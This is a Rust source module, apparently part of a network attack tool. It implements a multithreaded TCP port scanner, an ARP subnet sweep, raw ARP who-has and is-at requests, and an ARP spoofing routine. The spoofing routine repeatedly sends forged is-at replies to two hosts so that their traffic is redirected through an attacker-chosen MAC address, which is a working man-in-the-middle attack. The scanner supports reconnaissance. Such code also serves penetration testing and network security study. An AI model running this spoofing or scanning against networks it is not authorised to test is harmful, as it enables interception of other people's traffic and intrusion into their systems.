use std::{io::Write, net, thread, time::Duration};

use crate::*;

pub fn scan_ports(config: &Config) -> Result<Vec<u16>, CursedErrorHandle> {
    let target: Ipv4 = match config.get_tip() {
        Some(target) => target,
        None => {
            return Err(CursedErrorHandle::new(
                CursedError::NotEnought,
                String::from("--tip is required for ports scan"),
            ))
        }
    };

    let threads_count: u64 = match config.get_threads() {
        Some(threads_count) => threads_count,
        None => {
            println!("!!! Since you didn\'t specified --threads option we will use 1 as default value !!!");
            1
        }
    };

    let threads_count: u16 = if threads_count > 65535 {
        return Err(CursedErrorHandle::new(
            CursedError::TooMany,
            format!("Too many threads max is 65535 ({} > 65535)", threads_count),
        ));
    } else {
        threads_count as u16
    };

    let mut threads: Vec<thread::JoinHandle<Vec<u16>>> = Vec::new();
    let mut open_ports: Vec<u16> = Vec::new();

    for i in 0..threads_count {
        let target: Ipv4 = target.clone();
        let timeout: Option<u64> = config.get_timeout();
        threads.push(thread::spawn(move || {
            scan_ports_thread(target, threads_count, i, timeout)
        }))
    }

    for thread in threads {
        let thread_open_ports: Vec<u16> = match thread.join() {
            Ok(open_ports) => open_ports,
            Err(err) => {
                let reason: String;

                if let Ok(error) = err.downcast::<String>() {
                    reason = format!("Can\'t join thread due to \"{}\"", error);
                } else {
                    reason = String::from("Can\'t join thread due to unknown error");
                }

                return Err(CursedErrorHandle::new(CursedError::ThreadJoin, reason));
            }
        };

        for open_port in thread_open_ports {
            open_ports.push(open_port)
        }
    }
    println!("|");

    open_ports.sort();
    Ok(open_ports)
}

fn scan_ports_thread(
    target: Ipv4,
    threads_count: u16,
    thread_index: u16,
    timeout: Option<u64>,
) -> Vec<u16> {
    let mut open_ports: Vec<u16> = Vec::new();
    let mut port: u16 = 1 + thread_index.clone();

    loop {
        let ip_addr: [u8; IPV4_LEN] = target.to();
        let addr: net::SocketAddr = net::SocketAddr::new(
            net::IpAddr::V4(net::Ipv4Addr::new(
                ip_addr[0], ip_addr[1], ip_addr[2], ip_addr[3],
            )),
            port.clone(),
        );

        let result: Result<net::TcpStream, std::io::Error> = match timeout {
            Some(timeout) => net::TcpStream::connect_timeout(&addr, Duration::from_millis(timeout)),
            None => net::TcpStream::connect(&addr),
        };

        if let Ok(_) = result {
            open_ports.push(port.clone());

            print!(".");
            std::io::stdout().flush().expect("Can\'t flush")
        }

        if port as u32 + threads_count as u32 > 65535 {
            break;
        }

        port += threads_count
    }

    open_ports
}

pub fn scan_network(config: &Config) -> Result<Vec<(Ipv4, Mac)>, CursedErrorHandle> {
    let netmask: Ipv4 = match config.get_netmask() {
        Some(netmask) => netmask,
        None => {
            return Err(CursedErrorHandle::new(
                CursedError::NotEnought,
                String::from("--netmask is required for network scan"),
            ))
        }
    };

    let interface: String = match config.get_interface() {
        Some(interface) => interface,
        None => {
            return Err(CursedErrorHandle::new(
                CursedError::NotEnought,
                String::from("--interface is required for network scan"),
            ))
        }
    };

    let threads_count: u64 = match config.get_threads() {
        Some(threads_count) => threads_count,
        None => {
            println!("!!! Since user didn\'t specified --threads option we will use 1 as default value !!!");
            1
        }
    };

    let timeout: u64 = match config.get_timeout() {
        Some(wait) => wait,
        None => {
            println!("!!! Since user didn\'t specified --timeout option we will use 250 as default value !!!");
            250
        }
    };

    let wait: u64 = match config.get_wait() {
        Some(wait) => wait,
        None => {
            println!(
                "!!! Since user didn\'t specified --wait option we will use 0 as default value !!!"
            );
            0
        }
    };

    let raw_netmask: u32 = netmask.to();
    let max_threads: u64 = power(2f64, raw_netmask.count_zeros() as u16) as u64;
    let threads_count: u32 = if threads_count > max_threads {
        return Err(CursedErrorHandle::new(
            CursedError::TooMany,
            format!(
                "Too many threads max is {0} ({1} > {0})",
                max_threads, threads_count
            ),
        ));
    } else {
        threads_count as u32
    };

    let arp: Arp = match Arp::new(&interface[..], false) {
        Ok(arp) => arp,
        Err(err) => return Err(err),
    };

    let target: Ipv4 = match config.get_tip() {
        Some(target) => target,
        None => {
            let ip: Ipv4 = arp.get_src_ip().clone();
            println!("!!! Since user didn\'t specified --tip option we will use machine ip instead ({}) !!!", ip);
            ip
        }
    };
    let mut devices: Vec<(Ipv4, Mac)> = Vec::new();

    let mut responses: Vec<ArpResponse> = Vec::new();
    let (tx, rx) = std::sync::mpsc::channel::<()>();
    let arp_reference: &Arp = &arp;

    thread::scope(|scope: &thread::Scope| {
        let mut threads: Vec<thread::ScopedJoinHandle<()>> = Vec::new();

        for thread_index in 0..threads_count {
            let info: SendWHInfo = SendWHInfo {
                threads_count,
                thread_index,
                arp: arp_reference,
                example: &target,
                netmask: &netmask,
            };

            threads.push(scope.spawn(move || send_wh_requests(info)))
        }

        let handle: thread::ScopedJoinHandle<Vec<ArpResponse>> = scope.spawn(move || {
            let mut responses: Vec<ArpResponse> = Vec::new();

            loop {
                match rx.try_recv() {
                    Ok(_) | Err(std::sync::mpsc::TryRecvError::Disconnected) => break,
                    Err(_) => {}
                }
                if let Ok(response) =
                    arp_reference.read_arp_timeout(Duration::from_millis(timeout), false)
                {
                    responses.push(response);
                    print!(".");
                    std::io::stdout().flush().expect("Can\'t flush");
                }
            }

            responses
        });

        for thread in threads {
            thread.join().expect("Can\'t join thread")
        }

        thread::sleep(Duration::from_millis(wait));

        if let Err(_) = tx.send(()) {
            println!("Can\'t message thread to stop")
        }

        responses = handle.join().expect("Can\'t join thread");
    });
    println!("|");

    arp.destroy();

    for response in responses {
        devices.push((response.get_src_ip(), response.get_src_mac()))
    }

    Ok(devices)
}

struct SendWHInfo<'arp_lt, 'ip_lt> {
    arp: &'arp_lt Arp,
    thread_index: u32,
    threads_count: u32,
    netmask: &'ip_lt Ipv4,
    example: &'ip_lt Ipv4,
}

fn send_wh_requests(info: SendWHInfo) {
    const U32_BITS_COUNT: usize = 32;

    let netmask: u32 = info.netmask.to();
    let example: u32 = info.example.to();

    let host_bits_count: u8 = netmask.count_zeros() as u8;

    let max_host: u32 = power(2f64, host_bits_count as u16) as u32 - 1;

    let mut ip: u32 = 0;

    for index in 0..U32_BITS_COUNT {
        if netmask.get_bit(index).to() {
            ip = ip.set_bit(example.get_bit(index), index);
        }
    }

    let mut host: u32 = info.thread_index as u32;

    loop {
        let mut host_index: usize = 0;

        for index in 0..U32_BITS_COUNT {
            let host_bit: bool = netmask.get_bit(index).to();
            if !host_bit {
                ip = ip.set_bit(host.get_bit(host_index), index);
                host_index += 1
            }
        }

        if ip != info.arp.get_src_ip().to() {
            let ip: Ipv4 = Handle::from(ip);

            let _ = info.arp.who_has(&ip, false);
        }

        if host + info.threads_count as u32 > max_host {
            break;
        }

        host += info.threads_count as u32
    }
}

pub fn who_has(config: &Config) -> Result<(Ipv4, Mac), CursedErrorHandle> {
    let target: Ipv4 = match config.get_tip() {
        Some(target) => target,
        None => {
            return Err(CursedErrorHandle::new(
                CursedError::NotEnought,
                String::from("--tip is required for who has request"),
            ))
        }
    };

    let interface: String = match config.get_interface() {
        Some(interface) => interface,
        None => {
            return Err(CursedErrorHandle::new(
                CursedError::NotEnought,
                String::from("--interface is required for who has request"),
            ))
        }
    };

    let timeout: Option<u64> = config.get_timeout();

    let arp: Arp = match Arp::new(&interface[..], false) {
        Ok(arp) => arp,
        Err(err) => return Err(err),
    };

    if let Err(err) = arp.who_has(&target, false) {
        return Err(err);
    }

    let result: Result<ArpResponse, CursedErrorHandle> = match timeout {
        Some(timeout) => arp.read_arp_timeout(Duration::from_millis(timeout), false),
        None => arp.read_arp(false),
    };

    arp.destroy();

    let response: ArpResponse = match result {
        Ok(response) => response,
        Err(err) => return Err(err),
    };

    Ok((response.get_src_ip(), response.get_src_mac()))
}

pub fn is_at(config: &Config) -> Result<(), CursedErrorHandle> {
    let dst_ip: Ipv4 = match config.get_tip() {
        Some(dst_ip) => dst_ip,
        None => {
            return Err(CursedErrorHandle::new(
                CursedError::NotEnought,
                String::from("--tip is required for is at request"),
            ))
        }
    };

    let dst_mac: Mac = match config.get_tmac() {
        Some(dst_mac) => dst_mac,
        None => {
            return Err(CursedErrorHandle::new(
                CursedError::NotEnought,
                String::from("--tmac is required for is at request"),
            ))
        }
    };

    let src_ip: Ipv4 = match config.get_sip() {
        Some(src_ip) => src_ip,
        None => {
            return Err(CursedErrorHandle::new(
                CursedError::NotEnought,
                String::from("--sip is required for is at request"),
            ))
        }
    };

    let src_mac: Mac = match config.get_smac() {
        Some(src_mac) => src_mac,
        None => {
            return Err(CursedErrorHandle::new(
                CursedError::NotEnought,
                String::from("--smac is required for is at request"),
            ))
        }
    };

    let interface: String = match config.get_interface() {
        Some(interface) => interface,
        None => {
            return Err(CursedErrorHandle::new(
                CursedError::NotEnought,
                String::from("--interface is required for is at request"),
            ))
        }
    };

    let arp: Arp = match Arp::new(&interface[..], false) {
        Ok(arp) => arp,
        Err(err) => return Err(err),
    };

    let result: Result<(), CursedErrorHandle> =
        arp.is_at(&src_mac, &src_ip, &dst_mac, &dst_ip, false);
    arp.destroy();

    result
}

pub fn spoof(config: &Config) -> Result<(), CursedErrorHandle> {
    let target_ip: Ipv4 = match config.get_tip() {
        Some(target) => target,
        None => {
            return Err(CursedErrorHandle::new(
                CursedError::NotEnought,
                String::from("--tip is required for arp spoofing"),
            ))
        }
    };

    let host_ip: Ipv4 = match config.get_sip() {
        Some(host) => host,
        None => {
            return Err(CursedErrorHandle::new(
                CursedError::NotEnought,
                String::from("--sip is required for arp spoofing"),
            ))
        }
    };

    let interface: String = match config.get_interface() {
        Some(interface) => interface,
        None => {
            return Err(CursedErrorHandle::new(
                CursedError::NotEnought,
                String::from("--interface is required for is at request"),
            ))
        }
    };

    let wait: u64 = match config.get_wait() {
        Some(wait) => wait,
        None => {
            println!(
                "!!! Since user didn\'t specified --wait option we will use 0 as default value !!!"
            );
            0
        }
    };

    let timeout: Option<u64> = config.get_timeout();

    let arp: Arp = match Arp::new(&interface[..], false) {
        Ok(arp) => arp,
        Err(err) => return Err(err),
    };
    let mitm_mac: Mac = match config.get_amac() {
        Some(mitm_mac) => mitm_mac,
        None => {
            let mitm_mac: Mac = arp.get_src_mac().clone();
            println!("!!! Since user didn\'t specified --amac option we will use interface mac instead ({}) !!!", mitm_mac);
            mitm_mac
        }
    };

    let target_mac: Mac = match config.get_tmac() {
        Some(target_mac) => target_mac,
        None => {
            println!("!!! Since user didn\'t specified --tmac option we will use arp who has request to get it !!!");
            if let Err(err) = arp.who_has(&target_ip, false) {
                return Err(err);
            }

            let result: Result<ArpResponse, CursedErrorHandle> = match timeout {
                Some(timeout) => arp.read_arp_timeout(Duration::from_millis(timeout), false),
                None => arp.read_arp(false),
            };

            match result {
                Ok(response) => response.get_src_mac(),
                Err(err) => return Err(err),
            }
        }
    };

    let host_mac: Mac = match config.get_smac() {
        Some(host_mac) => host_mac,
        None => {
            println!("!!! Since user didn\'t specified --smac option we will use arp who has request to get it !!!");
            if let Err(err) = arp.who_has(&host_ip, false) {
                return Err(err);
            }

            let result: Result<ArpResponse, CursedErrorHandle> = match timeout {
                Some(timeout) => arp.read_arp_timeout(Duration::from_millis(timeout), false),
                None => arp.read_arp(false),
            };

            match result {
                Ok(response) => response.get_src_mac(),
                Err(err) => return Err(err),
            }
        }
    };

    let arp_reference: &Arp = &arp;
    let host_ip_reference: &Ipv4 = &host_ip;
    let host_mac_reference: &Mac = &host_mac;
    let mitm_mac_reference: &Mac = &mitm_mac;
    let target_ip_reference: &Ipv4 = &target_ip;
    let target_mac_reference: &Mac = &target_mac;
    let (arp_sender, arp_receiver) = std::sync::mpsc::channel::<()>();
    thread::scope(move |scope: &thread::Scope| {
        let arp_handle: thread::ScopedJoinHandle<()> = scope.spawn(move || loop {
            match arp_receiver.try_recv() {
                Ok(_) | Err(std::sync::mpsc::TryRecvError::Disconnected) => break,
                Err(_) => {}
            }

            let _ = arp_reference.is_at(
                mitm_mac_reference,
                host_ip_reference,
                target_mac_reference,
                target_ip_reference,
                false,
            );
            let _ = arp_reference.is_at(
                mitm_mac_reference,
                target_ip_reference,
                host_mac_reference,
                host_ip_reference,
                false,
            );

            thread::sleep(Duration::from_millis(wait))
        });

        print!("Press enter to end task:");
        let _ = std::io::stdout().flush();

        let mut buffer: String = String::new();
        let _ = std::io::stdin().read_line(&mut buffer);

        arp_sender.send(()).expect("Can\'t terminate thread");
 
        arp_handle.join().expect("Can\'t join thread")
    });

    let result: Result<(), CursedErrorHandle> = arp.is_at(
        host_mac_reference,
        host_ip_reference,
        target_mac_reference,
        target_ip_reference,
        false,
    );
    if let Err(err) = arp.is_at(
        target_mac_reference,
        target_ip_reference,
        host_mac_reference,
        host_ip_reference,
        false,
    ) {
        return Err(err);
    }
    if let Err(err) = result {
        return Err(err);
    }

    arp.destroy();

    Ok(())
}
